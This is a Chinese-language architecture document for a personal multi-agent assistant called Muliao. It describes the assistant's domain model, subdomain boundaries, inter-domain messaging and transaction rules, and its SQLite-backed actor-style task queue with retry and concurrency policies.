# Muliao 架构

个人多 agent 助手。后端 Python（FastAPI + pydantic-ai），前端 React PWA（可添加到 iOS 主屏并接收 Web Push）。单机部署，SQLite + 文件目录。

## 1. 领域概念

| 概念 | 含义 | 事实存放处（唯一来源） |
|---|---|---|
| Agent | 一个助手：描述（角色）、模型、分发规则（角色 + allow/deny，`kind:name`）、私有记忆、名下的条目（skill、MCP server、secret）、工作目录。以系统生成、不可变的 `id`（12 位十六进制）标识——主键、目录名、URL、工具参数、配置引用都用它；`name` 只用于展示，可改、唯一（NFC 规范化，任意可见字符；不能取 `user`，模型按名称指派 issue 时它指用户，`naming.new_agent_name`）。删除进行中时记下发起者（`deleting_by`），不再出现在列表与名称解析里。可以归到一个分组（`group`），可以归档（`archived_at`，可取消；归档的不能运行，第 10 节）。最多一个是系统默认 agent（`is_default`，部分唯一索引；`AgentService.set_default`，HTTP `PUT/DELETE /api/agents/{id}/default`）：Web 新对话默认选中它，随 agent 行一起删除 | `agents` 表；名下的条目与记忆在 `items` / `memories`，工作目录 `data/workspaces/<id>/` |
| Session | 某个 agent 的一段对话，由某个触发源创建。种类（`kind`）决定它的规则：顶层会话、公开 thread、私有 thread（第 7 节） | `sessions` 表 |
| Message | pydantic-ai `ModelMessage` 原样序列化 | `messages` 表（每行一条 ModelMessage） |
| Mail | 投进某个会话信箱、交给它的 agent 的一封信件：用户消息（含附件）、对挂起调用的回答、触发器与委派来的任务、后台任务与 thread 的事件、运行中检查。按到达顺序排列，记下用户是否在等它的回答、不透明的关联 id（委派来的信件以委派的 holder 为关联 id，会话据此结清）、幂等键、状态（排队 / 已处理 / 被丢弃）与处理它的那次运行 | `mail` 表 |
| Hold（占用） | 别的工作替某个会话在外面做的一项异步工作：后台任务 `job:<id>`、委派 `delegation:<发起会话>:<工具调用 id>`（holder 全局唯一）。状态 active / released / cleared，记下用户是否在等它的结局、`ask_agent` 的调用 id。委派的全部状态就是发起方的这条占用。行永久保留（随会话删除） | `session_holds` 表 |
| Task | 一个待执行的工作单元：`run`（会话的一次运行）、`compaction`（上下文压缩）、`deliver`（投递通知）、`event`（领域事件或定向命令的一次投递） | `tasks` 表 |
| Compaction | session 早期消息的摘要，之后发给模型的上下文用它代替 `through_message_id` 及之前的消息 | `compactions` 表 |
| Job | agent 在后台跑的一条 shell 命令：发起它的会话、命令、注入的 secret 名、pid、状态（运行中 / 退出 / 被结束 / 被中断）、退出码。永久保留 | `jobs` 表；输出在工作目录的 `jobs/<id>.log` |
| Skill | 条目（kind=skill）：`SKILL.md`（YAML frontmatter: name, description + 正文）与文本附件。归平台（owner 为空）或某个 agent，名字全局唯一，按规则分发（第 13 节） | `items`（SKILL.md）+ `item_files`（附件）；磁盘上 `data/skills/<name>/` 是生成的只读副本 |
| Memory | 记忆，一份有长度上限的 markdown：所有 agent 共享的全局记忆，或 agent 私有的记忆。agent 的知识只有记忆与 skill 两种（没有单独的「指令」）。不是条目 | `memories` 表 |
| MCP server | 条目（kind=mcp）：MCP 连接配置，可引用 vault；归平台或某个 agent，名字全局唯一，按规则分发 | `items`（配置 JSON 与 enabled） |
| Secret | 条目（kind=secret）：加密保存的密码/token，通过 key 引用；归平台或某个 agent，key 全局唯一，按规则分发 | `items.secret`（Fernet 加密，`agents/secrets.py` 的 `Vault` 加解密，密文不出该模块） |
| Revision（版本） | 条目与记忆的一版：谁、何时、改前改后（各自的文本文档：记忆正文、skill 全部文件的 JSON、MCP 配置 JSON、secret 只有描述与设值时间，不含值）、说明。只追加，对象或 agent 删除后仍保留 | `revisions` 表 |
| File | 对话里出现的文件：用户随消息发送的图片与附件、agent 用 `share_file` 发出的文件。写入后不可变，按 id 引用，引用形式唯一（`/api/files/<id>/<名称>`）；与消息相互独立，删除会话不删文件 | `files` 表（元数据）；内容按 sha256 存在 `data/files/` |
| Notification | 发给用户的一条通知：标题、正文、指向的会话（系统通知如前置检查告警投不到 agent 时的兜底没有）、是否未读。通知页列出它们，未读数就是导航与应用图标的角标；Web Push 是它的投递方式，每台设备（推送订阅）一个 deliver task，只引用通知与订阅，内容不另存一份 | `notifications` 表 |
| History（工作历史）| agent 做过的一件事：哪天（配置时区的日历日）、标题、2–5 行摘要、引用（issue、会话、commit）、重要程度 1–3。只追加：agent 用 `history_append` 写自己的，库里的触发器拒绝 UPDATE / DELETE；不随 agent 删除而消失 | `agent_history` 表 + FTS5 虚表 `agent_history_fts` |
| ModelUsage（用量） | 一次模型运行报告的 token 用量：时间、agent、会话（没有就为空）、运行类型（对话 / 压缩；历史行里还有已删除的强制反思 `reflection` 与临时 agent `temp_agent`）、模型、请求数与各项 token。只增不改，也不随 agent 与会话的删除而消失——它是账目 | `model_usage` 表 |
| Issue（issue） | 人与 agent 协作的一件事：标题、描述、状态、优先级、负责项目（owner agent，必填、不随指派变）、指派人（agent / 用户 / 无）、依赖的上游 issue（有向无环）、时间线（评论与属性变化）。处于 in_progress 且上游都已完成时，每条动态投进被指派 agent 在这个 issue 上唯一的会话；没有 agent 接手时，用户的评论投给 owner | `issues`、`issue_activities`、`issue_dependencies` 表 |
| Trigger | 具名、持久的事件来源，把外部刺激变成投进某个会话信箱的一封信件；触发方式（定时、一次性、webhook……）多态实现。跑完不会再触发的标为已结束（`finished_at`），离开列表但留下历史 | `triggers` 表 |

目录：

```
data/
  muliao.db
  vapid_private.pem            # Web Push 密钥，首次启动生成
  files/<sha前两位>/<sha256>   # 对话里的文件内容（元数据在 files 表），相同内容只存一份
  files/tmp/                   # 上传中的临时文件，启动时清空
  skills/<name>/               # skill 目录的只读副本，由数据库生成（每次写 skill 后与启动时）
  workspaces/<id>/             # 文件工具与 shell 的工作目录（不做版本管理）
```

**条目与版本（#230、#239）**：skill、MCP server、secret 都是条目（`agents/items.py`，表 `items`：kind、name、owner、内容、enabled），名字按种类全局唯一，没有同名遮蔽；为别的 owner 已有的名字写入是冲突（409 / 交还模型）。**种类只在 `agents/kinds.py` 定义一次**：`Kind`（tool、skill、mcp、secret，即规则里的 kind 与条目页的种类）、`StoredKind`（存在 `items` 表里的三种：能改、能转移、有版本）、`Subject`（版本表的对象：三种条目 + memory、role、agent），以及唯一的文案表 `label`（错误信息、版本说明里同一种类同一个说法）；转换只用那里的 `as_kind` / `as_subject`。记忆存在 `memories`（全局一行 + 每个 agent 一行，与 agent 的行同一事务写入）。每次修改在同一个写事务里记一版（`agents/revisions.py` 的 `record_in`，前后相同不记；说明由 `described` 定：agent 用自我改进工具改记忆、skill 时必填 `reason`（针对的缺陷或重复模式、来源、与同一条以前改动的关系），记它——这就是 agent 自进化的时间线（#279）；界面与系统操作记默认的动作描述；文档不反映的修改用 `force=True` 照记，说明写清是什么：换 owner——文档不含 owner；secret 改值——文档只含描述）。有版本的对象与它们的文档：记忆（正文）、skill（全部文件的 JSON）、MCP（配置与启用状态）、secret（`{description}`，不含值、也不含由值推出的东西）、**角色**（`{description, allow, deny}`，name 是角色名；`Distribution` 的增删改，记改的人 actor）、**agent 的分发规则**（`{roles, allow, deny}`，存在表 `agent_rules`，name 是 agent 的 id；`AgentService.create` / `update` 经 `agent_rules` 的 `*_in` 写入，删除 agent 时由它记删除；名称、描述等其余字段不记）。条目里各种类写版本文档的方式登记在 `agents/ownership.py` 的 `DOCUMENTS`（给转移、删 agent 这类不经各 store 的写入用：`transfer_in`、`retire_owned_in`）。局部修改（记忆的 `memory_edit`、skill 的 `edit_skill`）的读、改、写也在这同一个写事务里，并发的编辑依次基于最新内容应用，不报冲突（#236）；只新建不覆盖的写入（skill 导入不带 replace、新增 MCP）在写入的事务里用 `items.creatable_in` 查重。历史与恢复：条目 `GET /api/items/{kind}/{name}/history`、`POST .../restore`（`ItemCatalog.history` / `restore`），记忆 `GET /api/memory/history?agent=`、`POST /api/memory/restore`；恢复 = 由对象自己的 store 在**一个**写事务里读出那一版（`revisions.revision_doc_in`）并作为新的一版写入（skill、MCP、记忆；secret 的版本不含值，不能恢复；角色与 agent 规则的版本只供查看，`knowledge-upkeep` 的 revisions.py 与每日知识审查读它们）。写入前校验（frontmatter、McpConfig、key 语法——key 语法在 `agents/secrets.py`，`${vault:KEY}` 引用（同一模块的 `VAULT_REF`）用同一个 `KEY_SYNTAX`），库里没有读不出来的坏条目。迁移前的文件资源目录已导入数据库，原目录改名为 `resources.imported` 只留档。

**skill 的生成目录**（`SkillStore.materialize`）：skill 的全部文件（SKILL.md 与附件；附件只收文本：后缀白名单、单个 256KB、UTF-8，规则在 `skill_package.is_attachment` / `accept`，二进制在 skill 里写明来源由安装脚本获取）存在数据库；磁盘上 `data/skills/<name>/` 是只读副本（文件 0444、脚本 0555、目录 0555），每次写入该 skill 后按数据库里当时的状态重新生成（先写临时目录再换上；一把锁串行，并发写入收敛到最后一次），启动时全量重新生成并删掉多余的目录。agent 在这里读、执行 skill 的脚本；改附件经 `write_skill` / `edit_skill` 的 `attachments_dir`（工作目录里的一个目录，整体替换附件；跳过的文件与原因写进工具结果）。删 agent 时先删它的 skill 的副本目录再删行。

**标准 .skill 文件的导入导出**（`agents/skill_package.py` 管格式，`SkillStore.export` / `import_package` 管读写）：格式按 Anthropic Agent Skills 的打包脚本（anthropics/skills 的 `skill-creator/scripts/package_skill.py`）：zip，唯一的顶层目录与 skill 同名，里面是 `SKILL.md` 与附件。导出（`GET /api/items/skill/{name}/package`）的是数据库里的全部文件，可执行位写进条目权限（导入时还原）。导入（`POST /api/items/skill?owner=&replace=`，请求体就是包，上限 `MAX_PACKAGE_BYTES`）：结构不对整个拒绝（绝对路径、`..`、反斜杠、符号链接、加密条目、重复条目（不分大小写与 Unicode 规范化形式）、文件与目录同名、顶层目录不唯一或有顶层文件、目录名不是合法 slug、没有 SKILL.md、frontmatter 不合 `write` 的规则；文件数与解开后的总大小按 zip 目录里声明的值在读之前拒绝），不合附件规则的文件不写入、在结果里逐个列出原因，`__MACOSX/` 也列为跳过。`SKILL.md` 原样写入，`license`、`metadata` 等其他 frontmatter 键保留。同名已存在时没有 `replace` 是 409；`replace` 只能覆盖同一 owner 的（附件整体换掉），别的 owner 的同名是冲突。记一版、改的人 `user`。agent 没有专门的工具：用 zip/unzip 加 `write_skill(attachments_dir=)` 就能做。

## 2. 领域与边界

### 2.1 领域

```
muliao/
  platform/        数据库、任务队列（actor 调度；别的领域经它的只读查询 TaskView 看自己 lane 上的任务）、事件与定向命令、实时展示总线、运行中检查的节拍、shell、id
  agent_runtime/   会话运行的端口：模型注册表、指令组装、工具组合（toolbox.py）、pydantic-ai 的逐步驱动、它自己写下的消息约定（工具交回的文件与图片）、MCP 连接
  sessions/        会话（子域：会话、运行、交互、外部工作、委派、到点唤醒、展示，见下表）：信箱、历史、运行、挂起的调用、占用、结清、委派与 thread、到点唤醒、压缩、停止、删除、种类、会话的消息约定
  workspace/       工作区：文件工具（read/write/edit_file、share_file）与 edit_file 的编辑规则、run_shell（前台与后台）、后台任务（jobs 表）
  agents/          agent 目录、条目（skill、MCP、secret；secret 的加解密与 ${vault:KEY} 引用解析在 agents/secrets.py）与记忆及其版本、自我改进工具、工具权限与角色
  usage/           模型用量：每次运行记一条，按时间范围汇总
  issues/          issue 看板：人与 agent 协作的事项，动态按状态与指派投进 agent 的 issue 会话
  speech/          语音输入：把界面录下的语音转成文字（可选，配置 [transcription] 才有）
  web/             网页搜索与抓取：配置的服务（WebProvider）与 web 工具组（可选，配置 [web] 才有）
  history/         工作历史：agent 做过的事，只追加，按时间与关键词检索
  files/  notifications/  triggers/
  api/             HTTP 适配
  container.py     组合根：构造领域、注册事件订阅、组装工具箱；只做装配，不含业务规则
  schema.py        汇总全部领域的表（Alembic、迁移测试、单领域写入断言）
```

每个领域独占自己的表（`<domain>/tables.py`）；领域之间的引用只是不透明的 id，没有跨领域外键。

**子域**：一个领域内部可以再分子域（同一事务协作、同一个统一语言，但各自独占自己的表或列）。子域之间只经对方的 `*_in` 接口（在调用方事务里的查询与写入，领域内部用，不进 `api.py`），不碰对方的表；跨子域的流程由编排模块调各子域的接口。目前分了子域的是 agents 与 sessions。agents：

| 子域 | 表 | 模块 | 给别的子域的接口 |
|---|---|---|---|
| 目录 | `agents`（身份、模型、默认、分组、归档、删除标记） | `service.py`（`AgentService`）、`active.py`、`naming.py`、`ids.py` | `check_active_in`（行本身 `active_row_in` / `runnable_row_in` 只给目录自己用）、`agent_names_in` / `agent_name_in`、`deleting_ids`；删除流程的 `deletable_in`、`mark_deleting_in`、`set_archived_in`、`deletion_actor_in`、`remove_in` |
| 分发 | `roles`、`agent_rules`（agent 的 roles / allow / deny，每个 agent 一行） | `permissions.py`（内置工具与规则）、`roles.py`、`agent_rules.py`、`access.py`（能用 / 能改、`Sharing`、`Reach`）、`distribution.py`（门面 `Distribution`） | `agent_rules_in`、`create_agent_rules_in` / `update_agent_rules_in` / `record_rules_deleted_in`、`grants_in`、`sharing_in`、`holders_in`、`changeable_in` / `writable_in` / `usable_in` |
| 条目 | `items`、`item_files` | `items.py`、`skills.py` / `skill_package.py`、`mcp.py`、`secrets.py`、`ownership.py`（转移与删 agent 时的去留）、`catalog.py`（门面 `ItemCatalog`） | `existing_in`、`creatable_in`、`keys_in` / `patterns_in` / `visible_in`、`owner_label_in`、`transfer_in`、`retire_owned_in` |
| 记忆 | `memories` | `memory.py`（`MemoryStore`） | `create_memory_in`、`record_memory_deleted_in` |
| 版本 | `revisions` | `revisions.py`、`kinds.py`（共享内核：每个子域写自己对象的版本） | `record_in`、`history_in`、`revision_doc_in` |

编排（不属于任何子域、自己不碰表）：`lifecycle.py`（删除与归档）。

能用、能改、预览、谁持有某角色（含隐含的 base）只在分发子域算；转移 owner 只有 `ownership.transfer_in` 一个实现（界面 / 工具的转移与删 agent 时转给平台共用）；删除 agent 的最后一步（`AgentLifecycle.on_sessions_cleared`）只依次调用条目、记忆、分发的记版本接口与目录的 `remove_in`，各子域名下的行随 agent 的行级联删除（同一领域内的外键）。

sessions（表类只在它的子域模块里出现在查询与构造中；领域内传递行对象、按 id 取会话不算，`tests/test_boundaries.py` 的 `SESSIONS_TABLES` 核对）：

| 子域 | 表 | 模块 | 给别的子域的接口 |
|---|---|---|---|
| 会话 | `sessions` | `directory.py`（新建一行、按属性查会话只在这里；按 id 取到的行在领域内可改，删除在 `deletion.py`）、`kinds.py`、`origins.py`、`inbound.py`（来信与新建会话的规则）、`info.py`（读模型）、`deletion.py`、`service.py`（门面） | `add_in`、`among_in`、`of_agent_in`、`keyed_rows_among` / `keyed_among`、`owned_threads_in`、`threads_of` / `thread_in` / `threads_named_in`、`listed_ids_in` / `listed_page_in` |
| 运行 | `messages`、`message_texts`（消息的可搜索文字）、`compactions`（历史）、`mail`（信箱）；运行本身是平台任务表里的 run task，只经 `TaskQueue` 的只读查询（`TaskView`）看 | `history.py`、`mailbox.py`、`runs.py`（运行与它的 payload）、`consumer.py`、`steps.py`、`finish.py`、`compaction.py`、`halt.py`、`settlement.py`、`conventions.py`、`reconcile.py`、`live.py` | 历史：`append_in`、`mark_last_stopped_in`、`saved_by_in`、`last_message_id_in`、`transcript_rows_in`、`add_compaction_in`、`load_context` 等；信箱：`post_in`、`queued_in`、`consume_in`、`discard_in`、`unsettled_in` / `mark_settled`、`wake_in` 等；运行：`latest_run` / `latest_runs_among`、`run_unfinished_in`、`hand_over_in`、`handed_to` |
| 交互 | —（由历史与信箱推导） | `pending.py`、`deferred.py`、`ask_user.py`、`questions.py`、`answers.py` | `pending_in`、`open_asks_of`、`waiting` |
| 外部工作 | `session_holds` | `holds.py`、`work.py`（`SessionWork`、交回结局 `deliver_in`、运行中检查的间隔规则 `DEFAULT_CHECK_SECONDS` / `check_due`）、`activity.py`（工作状态） | `hold_in`、`get_in`、`release`、`abandon`、`clear_in`、`active_holders_of_in`、`active_holders_in`、`called_in`、`deliver_in` |
| 委派 | `delegations`（每项委派的 thread、心跳间隔、超时）、`thread_calls`（哪次调用开出或续写了哪个 thread） | `delegations.py`（记录）、`thread_calls.py`（调用开出的 thread）、`delegation.py`（交回、检查与超时）、`threads.py`（发出）、`delegation_tools.py` | `record_in`、`records_among`、`threads_of_holds_in`、`hand_back_in`、`record_call_in` / `call_threads_in` |
| 到点唤醒 | `wakeups` | `wakeups.py`（约、取消、到点投信 `WakeUps`）、`wakeup_tools.py`（`wake_me`） | `schedule_in`、`cancel_in`、`WakeUps` |
| 展示 | — | `transcript.py`、`live.py`、`sources.py`（结构化的事件来源） | `to_items`、`annotate_asks` / `annotate_threads`、`parse_source` |

会话领域的编排（停止 `halt.py`、删除 `deletion.py`、消费者）只调各子域的接口；会话领域不 import 任务表的 `TaskStatus`，`Task` 只出现在任务处理器的签名里（`tests/test_boundaries.py`）。

其他领域不设子域，内部按模块组织。各自的表：workspace `jobs`；usage `model_usage`；history `agent_history`；files `files`；triggers `triggers`；issues `issues`、`issue_activities`、`issue_dependencies`；notifications `notifications`、`push_subscriptions`（speech、web、agent_runtime 没有表）。其中几张表由一个模块独占（`tests/test_boundaries.py` 的 `MODULE_TABLES` 登记并核对）：`issue_dependencies` 只在 issues 的依赖图 `graph.py`，`notifications` 只在收件箱 `inbox.py`，`push_subscriptions` 只在推送 `push.py`。issues 另有投递 `delivery.py` 与文本 `render.py`，`IssueService` 只编排（第 21 节）；triggers 的前置检查状态只在 `precheck.py` 迁移（第 14 节）。

`agent_runtime` 不是业务领域，是会话运行的端口：把 pydantic-ai 的 loop 收在「从这段历史推进一步，告诉我发生了什么」后面（`AgentRuntime.run_steps` 与 `StepHooks`），会话领域只依赖这个端口与消息约定；具体的工具不在这里（文件与 shell 在 `workspace`，web 工具在 `web`，各领域的 `tools.py`），它只按规则把组合根交来的工具集组合进运行（`Toolbox`）；以后自己写 loop 时改动限于这个端口的实现。端口不交出 pydantic-ai 的运行与挂起类型：运行的结局是 `Finished`（回答与新增消息）或 `Paused`（挂起的调用），挂起调用的结果以 `{调用 id: 结果}` 交回，工具用 `defer_call()` 挂起（`agent_runtime/outcome.py`）；消息（`ModelMessage`、`ToolCallPart` 等）是会话历史的存储形态，不在此列。`tests/test_boundaries.py` 检查 agent_runtime 之外不 import 这些运行类型。工具一律通过领域接口做事，不碰表。

### 2.2 领域之间怎么通信

只有三种：

- **命令**：请另一个领域做一件事，是对方公开接口上的一次调用，在**对方自己的事务**里执行。通常同步调用。发送方先在自己的事务里提交了状态、又必须保证命令执行时，用**定向命令**（`Messaging.send_in`，第 3.4 节）持久化。
- **事件**：宣布自己发生了什么，与状态变化在同一个本地事务里持久化（outbox），每个订阅者至少收到一次（第 3.3 节）。**发起用命令，反应用事件。**
- **查询**：只读，经对方的公开接口，返回对方定义的数据结构（读模型，如 `AgentInfo`、`SessionInfo`），不是 ORM 对象。

**跨领域查询与事务**：数据库禁止嵌套事务，跨领域查询在被查领域自己的事务里取快照，调用方先查后写。**一个领域的写入判断不得依赖在同一事务里读到的别的领域的数据**，除非被查的事实不可变或只会单向变化——文件写入后不变；agent 只会从可用变为正在删除、再变为不存在；会话只会从存在变为删除；会话的发起方不变。这类事实可以在自己的写事务里经对方的公开函数检查（`agents.api.active_agent_in`、`sessions.api.session_in`、`sessions.api.receive_command_in`），检查与写入之间插不进相反的变化。另一种可以的情况是双向变化、但只用来**拒绝**的事实：agent 是否归档（`agents.api.runnable_agent_in`）。写事务是 `BEGIN IMMEDIATE`、完全串行，同一事务里的检查与写入是原子的；判断结果在事务之外才生效的（定向命令 `Receive`），接收方在生效时再查一次（`on_receive`）；反方向的变化（取消归档）只会让一次拒绝显得多余，写不出错数据（第 10 节「归档」）。

**接口里谁管事务**：领域公开接口里的写入一律是被调领域自己开事务的命令（如会话领域给后台任务的 `SessionWork.hold`），调用方不替它管事务。接收调用方事务 `s` 的公开函数只能是只读的查询，`tests/test_boundaries.py` 列出了经过审查的这几个；新增要先确认它只读。

**强一致只在一个领域内部**，并且尽量只在一个聚合（一个会话）内部。同时写多个会话的事务只有三种，都在会话领域内：委派的发出 `Threads.dispatch`（发起方的占用 + thread 的信件）与交回（thread 结清关联的事务里把结局投给发起方、释放占用），两者对称；以及删除会话（连同归它所有的私有 thread，并把公开 thread 的父会话置空）。不用 2PC：所有领域在同一个 SQLite 文件里，本地事务本来就原子；跨资源的地方（skill 的生成目录、文件存储、进程、Web Push、模型接口）保持「失败可见 + 对账」。多步发起留下的中间状态只能留在拥有对账的领域里。

| 级别 | 范围 | 机制 | 例子 |
|---|---|---|---|
| 强一致 | 一个领域内 | 一个本地事务 | 保存一步并把它带上的信件记为已处理；投信并判断是否唤醒；委派投递；停止会话 |
| 最终一致 | 领域之间 | 事件 + 定向命令，处理器的写入与投递完成同一事务 | 运行结束 → 推送；会话结清 → 委派交回结局；会话停止 → 结束后台任务、放弃委派；删除的清理 |
| 对账 | 数据库与外部资源之间，或多步发起的中间状态 | 失败可见 + 定期或启动时对账 | skill 生成目录的启动重建、文件存储 recover、重启时被中断的后台任务、信箱的唤醒与失败结清 |

每处最终一致的三条判据见第 18 节。

### 2.3 依赖规则

由 `tests/test_boundaries.py` 对源码的 import（含相对 import）做静态检查，`src/muliao` 下的目录不论有没有 `__init__.py` 都算领域（另列的平台、HTTP、迁移、构建产物除外）：

- 领域之间只能 import 对方的 `api` 模块（命令、查询、读模型）与 `events` 模块（它发布的事件、接收的定向命令）；不 import 别的领域的表，也不拿别的领域的 ORM 对象。
- `platform` 不 import 任何领域；领域不 import HTTP 适配层（`api/`）与组合根。
- 子域之间（agents、sessions，见 2.1 的表）即使在同一个事务里协作，也只经对方的 `*_in` 接口，不碰对方的表或列；表的归属在 `AGENTS_TABLES` / `SESSIONS_TABLES` 里登记，每张表恰好属于一个子域，表类只能出现在它所属子域的模块的查询与构造里。`*_in` 是领域内部接口，不进 `api.py`；跨子域的流程放在编排模块（agents 的 `lifecycle.py`，sessions 的 `halt.py`、`deletion.py`、消费者），由它依次调用各子域的接口。
- 每个领域都有 `api.py`（`__all__` 只列公开接口），缺了测试就失败：在调用方事务里执行的公开函数（参数里有调用方的事务）只能是登记过的只读查询，这条检查只看得到 `api` 模块。领域内部在自己事务里的写入（如通知的 `_enqueue_in`）是私有的。平台不认识领域的词汇：任务种类、会话来源、LLM SDK 的异常都在各自的领域里（3.2、第 5 节）。
- HTTP 适配层的一个路由文件只放一个领域（或子域）的接口，一个领域可以按子域或触发方式拆成几个文件：`api/agents.py`（agents 的目录与分发）、`items.py`（条目）、`memory.py`（记忆）、`revisions.py`（版本的输出格式，条目与记忆共用）、`models.py`（agent_runtime 的 provider 与模型列表）、`tasks.py`（平台的任务列表）、`triggers.py` / `webhook.py`、`notifications.py` / `push.py` 等。例外是 `features.py`：服务端配置决定的可选能力（现在只有语音输入），是界面的一个汇总查询，以后新的可选能力也加在这里。HTTP 适配层经领域的 `api`（与 `events`）调用领域，另外可以 import 领域的 `tables`，把领域交给它的行序列化成响应（它是适配器，不是领域，不另造一套读模型）。它拿到的对象只有 `container.Container` 上的：各领域的门面（字段类型都由领域的 `api` 导出）、平台的展示事件流（`EventFeed`，只订阅）与任务列表（`TaskAdmin`）、服务的生命周期；窄接口（`TaskAdmin`、`EventFeed`）是只转发窄方法的包装对象，不是 Protocol 标注——项目不跑类型检查，标注挡不住 HTTP 层调到完整对象的别的方法。测试检查字段的声明类型，也检查运行时的值恰好是声明的类型；装配出的全部对象在 `container.Assembly`，服务入口只把它的 `container` 交给 HTTP 层，测试夹具直接持有 `Assembly`。业务规则（例如为 agent 写条目与记忆前它必须还可用、只发文件时用文件名作标题、启动时已存 agent 的模型、角色与权限通配符必须可用）都在领域里，HTTP 层与组合根不另写一份。

**组合根没有构造环**：会话领域的装配在 `sessions/assembly.py`（`SessionPorts`：先于消费者的端口；`SessionDomain`：门面、压缩、消费者、信箱对账与任务处理器，`subscribe` 一处登记会话领域的全部订阅与命令处理），组合根不拼会话领域的内部对象。用到「停止会话」的领域（会话门面、委派工具、删除 agent 的会话清理）依赖端口 `sessions.halt.StopSession`，组合根交给它们的实现是 `sessions.halt.SessionStopper`，它由正在进行的运行的登记（`StoppableRuns`）与 `SessionHalt` 组成，先于消费者构造，消费者用同一份登记运行；要马上执行自己提交的投递的领域（会话、触发器、issue）拿的是 `platform.worker.RunNow` 端口，worker 由各领域的处理器组成、在最后构造，构造后绑定到端口，绑定之前调用当场报错。

经 `api` 的依赖无环、有方向：`files`、`agents`、`usage`、`speech`、`web` → `agent_runtime` → `sessions` → `workspace`、`notifications`、`triggers`、`issues`、`history`（`tests/test_boundaries.py` 的 `LAYERS`：领域只能 import 更早一层的 `api`，同层与反向都不行；新增领域要在那里定层）。反向需要的查询（删除 agent 时查会话是否忙）由组合根注入函数。事件与定向命令不受这个方向限制（订阅方 import 发布方的 `events`），`events` 模块只放消息的数据形状。

**一个写事务只写一个领域的表**（外加平台的任务表，它是每个领域的 outbox）：`Database(check_writes=...)` 记下每个事务的 ORM 写入与 insert / update / delete 语句，测试的容器打开 `schema.single_domain_writes` 作为开发期断言。数据库层的级联（`ON DELETE CASCADE`）不在记录里，它们都在会话领域内部。

## 3. 平台

### 3.1 数据库

SQLite 只有一个写者，`Database.transaction()` 在进程内用锁串行化所有事务，换来无丢失更新、无 `SQLITE_BUSY`；代价是事务内不得做模型调用、网络 IO 等慢操作。嵌套开事务会立即报错。取消的规则见第 4 节。

### 3.2 任务队列即 actor 调度

`tasks` 表是持久化的任务队列，也是 actor 调度器：每个 task 带 `lane`，同一 lane 内严格 FIFO（更早的排队任务、或进行中的任务挡住后面的）、同一时刻最多一个 running；不同 lane 并发。平台只提供 lane 的机制，lane 名由用它的领域定义：会话领域的都在 `sessions/lanes.py`（会话 actor 的邮箱 `session:<id>`，运行、压缩都在这条 lane 上串行执行；`Receive` 与会话之外的工作各自的 lane），deliver 的 `deliver:<会话>:<设备>`（系统通知按 agent，没有 agent 的是 `deliver:system:<设备>`；设备是 endpoint 的摘要，lane 会进日志而 endpoint 是订阅凭据）在通知领域。别的领域不拼这些名字，要问会话忙不忙用会话领域的 `SessionActivity`。

- **任务种类**：`tasks.kind` 是不透明的字符串，由各领域定义（会话的 `run`、`compaction` 在 `sessions/lanes.py`，通知的 `deliver` 在它的 service），在组合根为它登记处理器；平台只有自己的 `event`（`platform.tables.EVENT_TASK`），不枚举领域的种类。`tasks.agent_id` / `session_id` 是有意的例外：平台为「任务」页展示（以及日志）而保留的归属引用，对平台是不透明的，平台不解释它们（是否属于哪个会话、会话忙不忙由会话领域判断）。登记时同一种类出现两次即报错（`platform.worker.register_handlers`），队列只接受登记过的种类（`TaskQueue.accept`，此后 `enqueue` 当场拒绝别的种类）。库里还没完成的 task 若是没有处理器的种类（如改名前写入的旧值），启动时记 error（`TaskQueue.check_kinds`）：它永远不会被领取，还挡住它的 lane，只能由人恢复处理器或在库里删掉它。
- **TaskHandler 接口**：每种 kind 一个实现，worker 只负责领取、调用、按结果记账，不关心 kind 的细节。处理器分两段：`execute` 做事（可以开自己的事务、调用别的领域的命令），返回的 `Commit` 与「task 记为完成」在同一个事务里提交（`TaskQueue.complete`）。task 不设总时限：一次运行跑多久由 agent 自己判断，卡住的单个调用由各自的时限兜底（阻塞工具必填的 timeout：`run_shell` 前台命令、`ask_agent`；MCP 工具调用的读超时、web 工具与推送的请求时限、模型 HTTP 请求每次读的空闲时限等；持续慢速输出的流不受后者约束），会话轮次整体靠用户停止。
- **并发：任务不设上限，在稀缺资源处限流**：worker 领取并执行所有可领取的 task（`Worker.run_forever`），同一 lane 内的顺序与互斥由队列保证，task 本身只是一个协程，不是稀缺资源。稀缺的是模型调用（限流与费用）：每个 provider 一个并发上限（`ProviderConfig.max_concurrency`，默认 4），这个 provider 下所有模型、所有 agent 共用，在 `ModelRegistry.resolve` 统一套上（pydantic-ai 的 `ConcurrencyLimitedModel`，流式请求在整个流期间占一个），请求排队与等了多久记日志（`model request waiting for a slot` / `got a slot`）。所有模型调用（会话运行、压缩）都经 `resolve` 拿模型，所以一处限住全部；一个运行只在真正请求模型时排队，跑工具、等后台任务时不占配额。机器算力（agent 跑的测试、编译）不限，由操作系统调度。别的有限资源同样在用的地方限：Web Push 的同步请求每个占一个线程，限 4 个（`notifications/webpush.py`），推送服务变慢时不会占满线程池、拖慢附件读取等别的线程上的工作。曾经按 task 数设槽位（`runtime.worker_concurrency`）：槽位既限多了（4 个长时间的会话运行占满槽位，79 个毫秒级的投递排队 17 分钟；跑工具的运行挡着别的会话调用模型），又没限住真正的负载（4 个运行可能同时请求模型，也可能都在跑测试），所以去掉。
- **失败**：契约内的失败（第 5 节）按指数退避重试（单次间隔封顶 `task_retry_max_delay_seconds`）：外部服务不可用（`ServiceUnavailable`：模型的 `ModelUnavailable`、推送服务 5xx/429/连不上）上限 `outage_retry_max_attempts`（默认约 30 分钟窗口，relay 503 曾持续 9–30 分钟，本机到境外 HTTPS 曾断开十几分钟 #208），其余暂时性失败上限 `task_max_attempts`，策略由 `platform/tasks.py` 的 `Retries` 按异常类型选，尝试次数两类共用一个计数；最终失败时处理器的 `failed_in` 在记下失败的同一事务里收尾（如把失败交回等着的会话）。「任务」页可查并可手动重试（沿用原 id，所以仍按原顺序；重试把尝试次数清零）。进程崩溃后启动时把 `running` 复位为 `pending`（`Worker.recover`：在启动阶段、任何循环与 HTTP 开始之前执行，放在领取循环里会复位抢先开始的请求或运行经 `run_now` 已经领走的 task；按种类恢复，没有处理器的种类不复位，由 `TaskQueue.check_kinds` 报出），尝试次数已经用完的除外：任务自己会让进程退出时（例如它执行的命令重启了服务），恢复—重启—再恢复会无限循环下去、还一直占住它的 lane，这时按最终失败记账（上限取两种策略中较大的，免得按 outage 策略重试中的任务因一次重启被判失败；收尾钩子照常执行，失败照常可见）。
